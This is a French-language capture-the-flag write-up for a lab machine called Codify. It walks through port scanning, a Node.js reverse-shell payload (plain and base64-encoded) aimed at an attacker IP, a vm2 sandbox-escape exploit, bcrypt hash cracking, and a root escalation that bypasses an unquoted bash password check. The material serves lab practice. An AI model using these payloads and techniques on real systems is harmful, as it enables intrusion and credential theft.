  # Codify

	echo "10.10.11.239 codify.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.239 -e tun0 > ports.txt
	sudo nmap -p- -T4 -A 10.10.11.239 -oN nmap.txt
	feroxbuster --silent -u http://codify.htb
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
    |_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
    80/tcp   open  http    Apache httpd 2.4.52
    |_http-title: Did not follow redirect to http://codify.htb/
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    3000/tcp open  http    Node.js Express framework
    |_http-title: Codify


Le port 80 et le port 3000 semblent amener sur la même page web, mais en regardant le code source on voit pas mal de Javascript en plus pour le port 3000. J'ai décidé de commencer mes tests dessus. 

Le site permet de faire exécuter du NodeJS, j'ai directement testé un reverse-shell. 

Voir : https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73

Certaines fonctions semblent interdites : 

    (function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(9999, "10.10.16.89", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();

> Error: Module "child_process" is not allowed

Même le Base64 ne passe pas si le payload contient ces fonctions interdites : 

    eval(new Buffer("KGZ1bmN0aW9uKCl7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksIHNoID0gY3Auc3Bhd24oIi9iaW4vc2giLCBbXSk7IHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOyBjbGllbnQuY29ubmVjdCg5OTk5LCAiMTAuMTAuMTYuODkiLCBmdW5jdGlvbigpeyBjbGllbnQucGlwZShzaC5zdGRpbik7IHNoLnN0ZG91dC5waXBlKGNsaWVudCk7IHNoLnN0ZGVyci5waXBlKGNsaWVudCk7IH0pOyByZXR1cm4gL2EvO30pKCk7","base64").toString("ascii"))
    
    
Je n'ai pas trouvé de moyen de contourner les filtres en place, mais j'ai trouvé un exploit pour l'environnement VM2 utilisé par le site (que l'on peut voir dans http://codify.htb:3000/about) : 

https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244


Le payload suivant me retourne bien mon identité : 

    const {VM} = require("vm2");
    const vm = new VM();

    const code = `
    err = {};
    const handler = {
        getPrototypeOf(target) {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
    };

    const proxiedErr = new Proxy(err, handler);
    try {
        throw proxiedErr;
    } catch ({constructor: c}) {
        c.constructor('return process')().mainModule.require('child_process').execSync('id');
    }

    console.log(vm.run(code));

> uid=1001(svc) gid=1001(svc) groups=1001(svc)

Les commandes sont très limitées, impossible d'obtenir un reverse-shell fiabilisé directement.

J'ai fouillé le système de fichiers : 

    find /home/svc
    ...
    find /var/www/
    
Le fichier **/var/www/contact/tickets.db** semble intéressant, il contient un hash pour l'utilisateur Joshua : 

    cat /var/www/contact/tickets.db
    
> joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2


J'ai tenté de le casser avec JTR : 

    hashid -m '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
    john --wordlist=/usr/share/wordlists/rockyou.txt hash_joshua.txt --format=bcrypt --rule /usr/share/hashcat/rules/best64.rule
    


On obtient le mot de passe de Joshua au bout de quelques minutes.

	ssh joshua@10.10.11.239
	cat user.txt	 

## Élévation de privilèges

	sudo -l

> User joshua may run the following commands on codify:
    &nbsp;&nbsp;&nbsp;&nbsp;(root) /opt/scripts/mysql-backup.sh


Ce script de sauvegarde est exécuté en tant que root mais demande un mot de passe. En revanche, le mot de passe n'est pas entouré de guillemets : 

    if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
    else
            /usr/bin/echo "Password confirmation failed!"
            exit 1
    fi

Cette absence de guillemets permet de faire du pattern matching.
<br>Voir : https://mywiki.wooledge.org/BashPitfalls (Partie 4)

Il suffit donc de mettre le caractère '*' pour contourner le mot de passe demandé.

Le script s'exécute bien mais ne nous retourne rien d'intéressant et ne permet pas de faire quoi que ce soit d'autre.

J'ai décidé de lancer Pspy pour l'espionner : 

    wget http://10.10.16.89/pspy64
    chmod 777 pspy64
    ./pspy64

En relançant le script et en le contournant comme avant, on voit le mot de passe root passer lors de la connexion à la base de données MySQL.

    su 
	cat /root/root.txt
